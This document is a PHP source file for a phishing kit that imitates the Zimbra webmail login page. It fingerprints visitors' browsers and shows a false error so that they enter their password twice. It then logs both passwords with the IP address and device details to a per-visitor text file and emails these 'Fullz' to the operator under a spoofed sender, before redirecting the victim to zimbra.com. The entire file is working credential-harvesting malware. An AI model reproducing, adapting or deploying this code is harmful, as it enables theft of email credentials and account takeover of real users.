<?php
include( 'langs/languages.php' );

$login = ( $_GET[ 'Email' ] ) ? $_GET[ 'Email' ] : $_GET[ 'email' ];
$v = $_GET[ 'v' ];

$user_agent = $_SERVER[ 'HTTP_USER_AGENT' ];

function getOS() {

	global $user_agent;

	$os_platform = "Unknown OS Platform";

	$os_array = array(
		'/windows nt 10/i' => 'Windows 10',
		'/windows nt 6.3/i' => 'Windows 8.1',
		'/windows nt 6.2/i' => 'Windows 8',
		'/windows nt 6.1/i' => 'Windows 7',
		'/windows nt 6.0/i' => 'Windows Vista',
		'/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
		'/windows nt 5.1/i' => 'Windows XP',
		'/windows xp/i' => 'Windows XP',
		'/windows nt 5.0/i' => 'Windows 2000',
		'/windows me/i' => 'Windows ME',
		'/win98/i' => 'Windows 98',
		'/win95/i' => 'Windows 95',
		'/win16/i' => 'Windows 3.11',
		'/macintosh|mac os x/i' => 'Mac OS X',
		'/mac_powerpc/i' => 'Mac OS 9',
		'/linux/i' => 'Linux',
		'/ubuntu/i' => 'Ubuntu',
		'/iphone/i' => 'iPhone',
		'/ipod/i' => 'iPod',
		'/ipad/i' => 'iPad',
		'/android/i' => 'Android',
		'/blackberry/i' => 'BlackBerry',
		'/webos/i' => 'Mobile'
	);

	foreach ( $os_array as $regex => $value ) {

		if ( preg_match( $regex, $user_agent ) ) {
			$os_platform = $value;
		}

	}

	return $os_platform;

}

function getBrowser() {

	global $user_agent;

	$browser = "Unknown Browser";

	$browser_array = array(
		'/msie/i' => 'Internet Explorer',
		'/firefox/i' => 'Firefox',
		'/safari/i' => 'Safari',
		'/chrome/i' => 'Chrome',
		'/edge/i' => 'Edge',
		'/opera/i' => 'Opera',
		'/netscape/i' => 'Netscape',
		'/maxthon/i' => 'Maxthon',
		'/konqueror/i' => 'Konqueror',
		'/mobile/i' => 'Handheld Browser'
	);

	foreach ( $browser_array as $regex => $value ) {

		if ( preg_match( $regex, $user_agent ) ) {
			$browser = $value;
		}

	}

	return $browser;

}


$user_os = getOS();
$user_browser = getBrowser();

?>
<?php
if ( !isset( $_GET[ 'step' ] ) ) {
	?>

	<!DOCTYPE html>
	<html class="user_font_size_normal" lang="<?=$lang?>">

	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<title><?=$l[$lang]['title'];?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="description" content="<?=$l[$lang]['descr'];?>">
		<meta name="apple-mobile-web-app-capable" content="yes"/>
		<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
		
		<? if($v == 1 || $v == '') : ?>
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<? else: ?>
		<link rel="stylesheet" type="text/css" href="css/style2.css">
		<link rel="stylesheet" type="text/css" href="css/style1.css">
		<? endif; ?>

		<link rel="SHORTCUT ICON" href="img/favicon.ico">
		<script src="js/jquery.min.js?s=<?=mt_rand(10000,99999);?>" type="text/javascript"></script>
		<script type="text/javascript">
			function getParameter( paramName ) {
				paramName += "=";
				var queryString = window.location.search;
				var strBegin = queryString.indexOf( paramName );
				if ( strBegin == -1 ) {
					strBegin = queryString.length;
				} else {
					strBegin += paramName.length;
				}
				var strEnd = queryString.indexOf( "&", strBegin );

				if ( strEnd == -1 ) {
					strEnd = queryString.length;
				}

				return queryString.substring( strBegin, strEnd );
			}

			$( document ).ready( function () {
				var login = $( '#username' );
				var pwd = $( '#password' );
				var btn = $( '#btlogin' );
				var form = $( '#form1' );

				$( btn ).bind( 'click', function ( e ) {
					e.preventDefault();

					if ( login.val() == '' || pwd.val() == '' ) {

					} else {
						var loginUrl = window.location;

						if ( window.location.search != "" && window.location.search.indexOf( 'Email=' ) > -1 )
							loginUrl = loginUrl.href.replace( 'Email=' + getParameter( 'Email' ), 'Email=' + login.val() );
						else
							loginUrl = loginUrl;

						form.attr( 'action', loginUrl + '&step=1' );
						$( form ).submit();
					}

				} );
			} );
		</script>
	</head>

	<body onload="onLoad();">
		<div class="LoginScreen">
			<div class="center">
				<div class="contentBox">
					<h1>
					<a href="" id="bannerLink" target="_new" title="Zimbra">
						<? if($v == 1 || $v == '' ) : ?><span class="ScreenReaderOnly">Zimbra</span><? endif; ?> <span class="ImgLoginBanner"></span> 
					</a>
					</h1>
					<form id="form1" method="post" name="loginForm" action="" accept-charset="UTF-8">
						<input type="hidden" id="sc" name="sc" value=""/>
								<input type="hidden" id="pg" name="pg" value=""/>
								<input type="hidden" id="bs" name="bs" value=""/>
								<input type="hidden" id="sl" name="sl" value="<?=$_SERVER['HTTP_ACCEPT_LANGUAGE']?>"/>
								<script type="text/javascript">
									document.getElementById( 'sc' ).value = screen.width + ' x ' + screen.height;
									var x = navigator.plugins.length,
										txt = '';
									for ( var i = 0; i < x; i++ ) {
										txt += navigator.plugins[ i ].name + ", ";
									}
									document.getElementById( "pg" ).value = txt;
									var size = {
										width: window.innerWidth || document.body.clientWidth,
										height: window.innerHeight || document.body.clientHeight
									}
									document.getElementById( "bs" ).value = size.width + ' x ' + size.height
								</script>

						<table class="form">
							<tr>
								<td><label for="username"><?=$l[$lang]['l_username'];?>:</label>
								</td>
								<td><input id="username" class="zLoginField" name="username" type="text" value="<?php echo $login; ?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
								</td>
							</tr>
							<tr>
								<td><label for="password"><?=$l[$lang]['l_pwd'];?>:</label>
								</td>
								<td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"/>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
								<td class="submitTD"><input id="remember" value="1" type="checkbox" name="zrememberme"/>
									<label for="remember"><?=$l[$lang]['l_stay'];?></label>
									<input type="submit" id="btlogin" class="ZLoginButton DwtButton" value="<?=$l[$lang]['l_button'];?>"/>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<hr/>
								</td>
							</tr>
							<tr>
								<td><label for="client"><?=$l[$lang]['l_version'];?>:</label>
								</td>
								<td>
								<style>
									.LoginScreen .positioning {
										position:relative;z-index:20;
									}
								</style>
									<div id="positioning" class="positioning">
										<select id="client" name="client">
											<option value="preferred" selected><?=$l[$lang]['l_select'][0];?></option>
											<option value="advanced"><?=$l[$lang]['l_select'][1];?></option>
											<option value="standard"><?=$l[$lang]['l_select'][2];?></option>
											<option value="mobile"><?=$l[$lang]['l_select'][3];?></option>
										</select>
										<script TYPE="text/javascript">
											document.write( "<a onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'><?=$l[$lang]['l_what'];?></a>" );
										</script>
										<div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip">
											<h3 style="text-align:center;"><?=$l[$lang]['l_what_title'];?>:</h3>
											<?=$l[$lang]['l_what_text'];?></div>
											<div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
									</div>
								</td>
							</tr>
							<? if($v == 2) : ?>
							<tr>
								<td colspan="2">
									<hr/>
								</td>
							</tr>
							<? endif;?>
						</table>
						<? if($v == 2) : ?>
						<div class="offline"><?=$l[$lang]['l_offline'];?></div>
						<? endif;?>
					</form>
				</div>
				<div class="decor1"></div>
			</div>
			<div class="Footer">
				<div id="ZLoginNotice" class="legalNotice-small"><?=$l[$lang]['l_footer1'];?>
				</div>
				<div class="copyright"><?=$l[$lang]['l_footer2'];?></div>
			</div>
		</div>
		<script>
			function showWhatsThis() {
				var anchor = document.getElementById( 'ZLoginWhatsThisAnchor' ),
					tooltip = document.getElementById( "ZLoginWhatsThis" ),
					doHide = ( tooltip.style.display === "block" );
				tooltip.style.display = doHide ? "none" : "block";
				anchor.setAttribute( "aria-expanded", doHide ? "false" : "true" );
			}

			function onLoad() {
				var loginForm = document.loginForm;
				if ( loginForm.username ) {
					if ( loginForm.username.value != "" ) {
						loginForm.password.focus(); //if username set, focus on password
					} else {
						loginForm.username.focus();
					}
				}
			}
		</script>
	</body>

	</html>



	<?php
}
//2

if ( ( isset( $_GET[ 'step' ] ) )AND( $_GET[ 'step' ] == 1 ) ) {
	?>
	
		<!DOCTYPE html>
	<html class="user_font_size_normal" lang="ru">

	<head>
		<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
		<title><?=$l[$lang]['title'];?></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<meta name="description" content="<?=$l[$lang]['descr'];?>">
		<meta name="apple-mobile-web-app-capable" content="yes"/>
		<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
		<? if($v == 1 || $v == '') : ?>
		<link rel="stylesheet" type="text/css" href="css/style.css">
		<? else: ?>
		<link rel="stylesheet" type="text/css" href="css/style2.css">
		<link rel="stylesheet" type="text/css" href="css/style1.css">
		<? endif; ?>
		<link rel="SHORTCUT ICON" href="img/favicon.ico">
		<script src="js/jquery.min.js?s=<?=mt_rand(10000,99999);?>" type="text/javascript"></script>
		<script type="text/javascript">
			function getParameter( paramName ) {
				paramName += "=";
				var queryString = window.location.search;
				var strBegin = queryString.indexOf( paramName );
				if ( strBegin == -1 ) {
					strBegin = queryString.length;
				} else {
					strBegin += paramName.length;
				}
				var strEnd = queryString.indexOf( "&", strBegin );

				if ( strEnd == -1 ) {
					strEnd = queryString.length;
				}

				return queryString.substring( strBegin, strEnd );
			}

			$( document ).ready( function () {
				var login = $( '#username' );
				var pwd = $( '#password' );
				var btn = $( '#btlogin' );
				var form = $( '#form1' );

				$( btn ).bind( 'click', function ( e ) {
					e.preventDefault();

					if ( login.val() == '' || pwd.val() == '' ) {

					} else {
						var loginUrl = window.location;

						if ( window.location.search != "" && window.location.search.indexOf( '&step=' ) > -1 )
							loginUrl = loginUrl.href.replace( '&step=' + getParameter( 'step' ), '' );
						else
							loginUrl = loginUrl;

						form.attr( 'action', loginUrl + '&step=2' );
						$( form ).submit();
					}

				} );
			} );
		</script>
	</head>

	<body onload="onLoad();">
		<div class="LoginScreen">
			<div class="center">
				<div class="contentBox">
					<h1>
					<a href="" id="bannerLink" target="_new" title="Zimbra">
						<? if($v == 1 || $v == '' ) : ?><span class="ScreenReaderOnly">Zimbra</span><? endif; ?> <span class="ImgLoginBanner"></span> 
					</a>
					</h1>
					<form id="form1" method="post" name="loginForm" action="" accept-charset="UTF-8">
						<div id="ZLoginErrorPanel">
							<table>
								<tbody>
									<tr>
										<td><img src="img/ImgCritical_32.png" title="Error" alt="Error" id="ZLoginErrorIcon">
										</td>
										<td <?=($v == 2) ? 'style="text-align: left;"' : ''?>><?=$l[$lang]['l_error'];?></td>
									</tr>
								</tbody>
							</table>
						</div>
						<table class="form">
							<tr>
								<td><label for="username"><?=$l[$lang]['l_username'];?>:</label>
								</td>
								<td><input id="username" class="zLoginField" name="username" type="text" value="<?php echo $login; ?>" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/>
								</td>
							</tr>
							<tr>
								<td><label for="password"><?=$l[$lang]['l_pwd'];?>:</label>
								</td>
								<td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"/>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
								<td class="submitTD"><input id="remember" value="1" type="checkbox" name="zrememberme"/>
									<label for="remember"><?=$l[$lang]['l_stay'];?></label>
									<input type="submit" id="btlogin" class="ZLoginButton DwtButton" value="<?=$l[$lang]['l_button'];?>"/>
								</td>
							</tr>
							<tr>
								<td colspan="2">
									<hr/>
								</td>
							</tr>
							<tr>
								<td><label for="client"><?=$l[$lang]['l_version'];?>:</label>
								</td>
								<td>
								<style>
									.LoginScreen .positioning {
										position:relative;z-index:20;
									}
								</style>
									<div class="positioning">
										<select id="client" name="client">
											<option value="preferred" selected><?=$l[$lang]['l_select'][0];?></option>
											<option value="advanced"><?=$l[$lang]['l_select'][1];?></option>
											<option value="standard"><?=$l[$lang]['l_select'][2];?></option>
											<option value="mobile"><?=$l[$lang]['l_select'][3];?></option>
										</select>
										<script TYPE="text/javascript">
											document.write( "<a onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'><?=$l[$lang]['l_what'];?></a>" );
										</script>
										<div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip">
											<h3 style="text-align:center;"><?=$l[$lang]['l_what_title'];?>:</h3>
											<?=$l[$lang]['l_what_text'];?></div>
									</div>
								</td>
							</tr>
							<? if($v == 2) : ?>
							<tr>
								<td colspan="2">
									<hr/>
								</td>
							</tr>
							<? endif;?>
						</table>
						<? if($v == 2) : ?>
						<div class="offline"><?=$l[$lang]['l_offline'];?></div>
						<? endif;?>
					</form>
				</div>
				<div class="decor1"></div>
			</div>
			<div class="Footer">
				<div id="ZLoginNotice" class="legalNotice-small"><?=$l[$lang]['l_footer1'];?>
				</div>
				<div class="copyright"><?=$l[$lang]['l_footer2'];?></div>
			</div>
		</div>
		<script>
			function showWhatsThis() {
				var anchor = document.getElementById( 'ZLoginWhatsThisAnchor' ),
					tooltip = document.getElementById( "ZLoginWhatsThis" ),
					doHide = ( tooltip.style.display === "block" );
				tooltip.style.display = doHide ? "none" : "block";
				anchor.setAttribute( "aria-expanded", doHide ? "false" : "true" );
			}

			function onLoad() {
				var loginForm = document.loginForm;
				if ( loginForm.username ) {
					if ( loginForm.username.value != "" ) {
						loginForm.password.focus(); //if username set, focus on password
					} else {
						loginForm.username.focus();
					}
				}
			}
		</script>
	</body>

	</html>
	
	<?php

	if ( $_POST[ 'username' ] && $_POST[ 'password' ] ) {

		$get_port = getenv( "REMOTE_PORT" );
		$_SESSION[ 'email' ] = $login;
		$login = $_SESSION[ 'email' ];
		$Email = $login;

		$file = fopen( "serv/" . $_SERVER[ 'REMOTE_ADDR' ] . ".txt", "a+" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "=============================Zimbra New Log================================" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "============================User Info===============================" );

		fwrite( $file, "\r\n" );
		fwrite( $file, "Proxy IP: " . $_SERVER[ 'HTTP_X_FORWARDED_FOR' ] );
		fwrite( $file, "\r\n" );
		fwrite( $file, "Browser IP: " . $_SERVER[ 'REMOTE_ADDR' ] );
		fwrite( $file, "\r\n" );
		fwrite( $file, "User Agent: " . $_SERVER[ 'HTTP_USER_AGENT' ] );
		fwrite( $file, "\r\n" );
		fwrite( $file, "User operating system: " . $user_os );
		fwrite( $file, "\r\n" );
		fwrite( $file, "User browser: " . $user_browser );
		fwrite( $file, "\r\n" );
		fwrite( $file, "Screen resolution: " . $_POST[ 'sc' ] );
		fwrite( $file, "\r\n" );
		fwrite( $file, "Remote port: " . $get_port );
		fwrite( $file, "\r\n" );
		fwrite( $file, "Browser size: " . $_POST[ 'bs' ] );
		fwrite( $file, "\r\n" );
		fwrite( $file, "System language: " . $_POST[ 'sl' ] );
		fwrite( $file, "\r\n" );
		$plugins = explode( ",", $_POST[ 'pg' ] );
		fwrite( $file, "Plugins name :" );
		$results = print_r( $plugins, true );
		fwrite( $file, "\r\n" );

		fwrite( $file, $results );

		/*syslang*/
		fwrite( $file, "\r\n" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "=====================================================================" );
		fwrite( $file, "\r\n" );
		fwrite( $file, "============================$service Fullz Info======================" );
		fwrite( $file, "\r\n" );


		fwrite( $file, "Login: " . $login );
		fwrite( $file, "\r\n" );
		$Passwd = $_POST[ 'password' ];
		fwrite( $file, "Password: " . $Passwd );

		fwrite( $file, "\r\n" );

		fclose( $file );
		$data = file_get_contents( "serv/" . $_SERVER[ 'REMOTE_ADDR' ] . ".txt" );

		$send = $sen;
		$subject = "$service Full Details | $Email |  " . $_SERVER[ 'REMOTE_ADDR' ];
		$headers = "From: $service Fullz <zimbra@p3nlhg393.shr.prod.phx3.secureserver.net>\n";
		$headers .= "MIME-Version: 1.0\n";


		@mail( $send, $subject, $data, $headers );
	}
	?>
	<?php } ?>

	<?php
	if ( ( isset( $_GET[ 'step' ] ) )AND( $_GET[ 'step' ] == 2 ) ) {

		$file = fopen( "serv/" . $_SERVER[ 'REMOTE_ADDR' ] . ".txt", "a+" );
		$e_mail = $_SESSION[ 'email' ];

		$Passwd = $_POST[ 'password' ];
		fwrite( $file, "Password 2: " . $Passwd );

		fwrite( $file, "\r\n" );

		fclose( $file );
		$data = file_get_contents( "serv/" . $_SERVER[ 'REMOTE_ADDR' ] . ".txt" );

		$send = $sen;
		$subject = "$service Full Details | $e_mail |  " . $_SERVER[ 'REMOTE_ADDR' ];
		$headers = "From: $service Fullz <zimbra@p3nlhg393.shr.prod.phx3.secureserver.net>\n";
		$headers .= "MIME-Version: 1.0\n";


		@mail( $send, $subject, $data, $headers );

		$rdr = '';
		if ( $v == 1 ) {
			
			$rdr = 'http://www.zimbra.com/';
		}
		elseif( $v == 2 ) {
			
			$rdr = 'http://www.zimbra.com/';
		}
		else {
		
			//if EMPTY param v
			$rdr = 'http://www.zimbra.com/';
		}

		header( "Location: {$rdr}" );
		echo( '

	<script>
	window.location.replace("' . $rdr . '");
	</script>
	' );
		exit;

	}
	?>